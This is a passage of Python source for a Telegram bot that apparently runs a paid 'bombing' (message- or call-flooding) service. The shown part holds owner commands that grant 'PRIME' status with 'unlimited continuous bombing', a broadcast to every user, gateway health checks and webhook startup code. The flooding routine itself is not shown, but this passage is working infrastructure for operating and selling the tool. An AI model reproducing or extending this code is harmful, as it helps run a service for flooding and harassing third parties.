            state.pop(user_id, None)
            await msg.reply_text(f'⭐ primed: `{target}`', parse_mode='Markdown', reply_markup=kb_owner())
            try:
                await context.bot.send_message(target,
                    '⭐ *you have been granted PRIME.*\n\n♾️ unlimited continuous bombing unlocked.',
                    parse_mode='Markdown')
            except Exception:
                pass
            return

        if step == 'own_revokeprime':
            if not is_owner(user_id):
                state.pop(user_id, None)
                return
            try:
                target = int(text)
            except ValueError:
                await msg.reply_text('❌ invalid ID.')
                return
            set_prime(target, False)
            state.pop(user_id, None)
            await msg.reply_text(f'🚫 unprimed: `{target}`', parse_mode='Markdown', reply_markup=kb_owner())
            return

        if step == 'own_broadcast':
            if not is_owner(user_id):
                state.pop(user_id, None)
                return
            cur.execute('SELECT user_id FROM users')
            users = cur.fetchall()
            okn = 0; fail = 0
            for u in users:
                try:
                    await context.bot.send_message(u['user_id'], f'📢 *broadcast*\n\n{text}', parse_mode='Markdown')
                    okn += 1
                except Exception:
                    fail += 1
                await asyncio.sleep(0.06)
            state.pop(user_id, None)
            await msg.reply_text(f'📢 broadcast done. ok: {okn}, failed: {fail}', reply_markup=kb_owner())
            return
    except Exception as e:
        print(f'[msg error] {e}')

# ============================================================
# BOOT
# ============================================================

async def post_init(app: Application):
    try:
        if OWNER_USERNAME:
            try:
                chat = await app.bot.get_chat(OWNER_USERNAME)
                print(f'[owner-username] {OWNER_USERNAME} -> {chat.id}')
            except Exception as e:
                print(f'[owner-username] resolve failed: {e}')
        if OWNER_ID:
            cur.execute('INSERT OR IGNORE INTO admins (user_id) VALUES (?)', (OWNER_ID,))
            db.commit()
            print(f'[owner] id set: {OWNER_ID}')
        print('🤖 checking gateway health...')
        await check_gateway_health()
        print('✅ gateway check done.')
    except Exception as e:
        print(f'[post_init error] {e}')

async def health(request):
    return web.Response(text='ok')

async def telegram_webhook(request):
    try:
        data = await request.json()
        update = Update.de_json(data, app_bot)
        await app_instance.update_queue.put(update)
        return web.Response(text='ok')
    except Exception as e:
        print(f'[webhook error] {e}')
        return web.Response(text='error', status=500)

async def health_loop(app):
    while True:
        await asyncio.sleep(1800)
        try:
            await check_gateway_health()
        except Exception as e:
            print(f'[health error] {e}')

async def main():
    global app_bot, app_instance
    logging.basicConfig(level=logging.WARNING)
    print('🚀 starting bot (webhook mode)...')
    print(f'[config] RENDER_URL={RENDER_URL or "unset"} PORT={PORT} OWNER_ID={OWNER_ID}')

    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    app_bot = app.bot
    app_instance = app

    app.add_handler(CommandHandler('start', cmd_start))
    app.add_handler(CommandHandler('prime', cmd_prime))
    app.add_handler(CommandHandler('unprime', cmd_unprime))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_message))

    await app.initialize()
    await app.start()

    if RENDER_URL:
        webhook_url = f'{RENDER_URL}/{BOT_TOKEN}'
        await app.bot.set_webhook(webhook_url)
        print(f'[webhook] set: {webhook_url}')
    else:
        print('[webhook] RENDER_URL not set — set env var.')
        return

    web_app = web.Application()
    web_app.router.add_get('/', health)
    web_app.router.add_post(f'/{BOT_TOKEN}', telegram_webhook)

    runner = web.AppRunner(web_app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    print(f'✅ webhook server on 0.0.0.0:{PORT}')

    asyncio.create_task(health_loop(app))
    await asyncio.Event().wait()

if __name__ == '__main__':
    asyncio.run(main())
